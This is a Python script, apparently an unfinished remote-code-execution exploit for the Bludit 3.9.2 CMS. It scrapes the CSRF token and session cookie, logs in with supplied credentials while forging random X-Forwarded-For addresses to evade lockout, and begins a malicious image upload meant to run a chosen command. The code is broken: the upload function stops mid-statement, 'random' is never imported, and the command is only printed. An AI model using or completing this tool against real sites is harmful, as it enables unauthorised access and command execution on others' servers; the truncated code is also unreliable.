#!/usr/bin/env python3

from http import client
import argparse
from re import search as research
from random import randint,choices


def banner():
    print("NO banner yet")
    
def argument_parser():
    parser = argparse.ArgumentParser(prog="bludit_3.9.2-RCE.py",usage="./bludit_3.9.2-RCE.py")
    parser.add_argument("--host",type=str,required=True,help="Specify host to connect Ex:[google.com]")
    parser.add_argument("--path",default="/",type=str,help="Specify webserv bludit login path Ex:[/bludit/admin]")
    parser.add_argument("--port",default=80,type=int,help="Specify web server port DEFAULT:80")
    parser.add_argument("-u","--usr",default="admin",type=str,required=True,help="Specify username",metavar="usr")
    parser.add_argument("-p","--psw",default="admin",type=str,required=True,help="Specify password",metavar="psw")
    parser.add_argument("-c","--command",type=str,required=True,help="Specify command to execute",metavar="cmd")
    args = parser.parse_args()

    return parser.parse_args()

def argument_checker(args):
    HTTPHandler = client.HTTPConnection(args.host, args.port)
    HTTPHandler.connect()
    
    HTTPHandler,cookie,token = argument_checker_host(HTTPHandler, args.host, args.path)
    HTTPHandler = argument_checker_credentials(HTTPHandler, args.host, args.path, cookie, token, args.usr, args.psw)
    upload_image(HTTPHandler, args.host, cookie)
    argument_checker_command(args.command)

def upload_image(HTTPHandler, host, cookie):
    boundary = "".join(random.choices("abcdef0123456789",k=20))
    bodydata = ""

    header = {
        "HOST":host,
        "User-Agent":"GoogleBot",
        "Connection":"close",
        "Cookie":cookie,
        "Content-Length":len(bodydata),
        "Content-Type":"multipart/form-data; boundary={}".format(boundary)
        }
    HTTPHandler.request("POST",

def argument_checker_host(HTTPHandler,host,path):
    """ 
    Initialize HTTPHandler, check host conectivity and
    check if bludit is running on the web server
    
    returns HTTPHandler,BLUDIT-KEY,Token
    """
    header = {
        "Host":host,
        "User-Agent":"GoogleBot",
        "Connection":"KeepAlive"
        }
    HTTPHandler.request("GET",path,headers=header)
    # Checking host conectivity
    try:
        response = HTTPHandler.getresponse()
    except:
        ERROR("argument_checker_host","host seems down")
    # Checking token and cookie existence
    try:
        token = research('input.+?name="tokenCSRF".+?value="(.+?)"', response.read().decode()).group(1)
        cookie = response.getheader("Set-Cookie").split(";")[0]
    except:
        ERROR("argument_checker_host","bludit cookie and token doesn't found")

    return HTTPHandler,cookie,token
    
def argument_checker_credentials(HTTPHandler, host, path, cookie, token, username, password):
    """ Try to login using credentials """
    bodydata = "tokenCSRF={}&username={}&password={}&save=".format(token,username,password)
    header = {
        "Host":host,
        "User-Agent":"GoogleBot",
        "X-Forwarded-For":"{}.{}.{}.{}".format(randint(10,255),randint(10,255),randint(10,255),randint(10,255)),
        "Connection":"close",
        "Content-Type":"application/x-www-form-urlencoded",
        "Content-Length":len(bodydata),
        "DNT":"1",
        "Cookie":cookie
        }
    HTTPHandler.request("POST",path,body=bodydata,headers=header)
    # Checking host conectivity again
    try:
        response = HTTPHandler.getresponse()
    except:
        ERROR("argument_checker_credentials","unable to send POST request")
    if response.getheader("Location")== None:
        ERROR("argument_checker_credentials","invalid credentials")

    return HTTPHandler
        
def argument_checker_command(cmd):
    print(cmd)

def ERROR(msg1,msg2):
    """ 
    msg1 = location
    msg2 = reason
    """
    print("==================")
    print("#### ERROR #######")
    print("[X] {}".format(msg1))
    print("[X] {}".format(msg2))
    print("==================")
    exit()    


if __name__ == "__main__":
    banner()
    args = argument_parser()
    argument_checker(args)
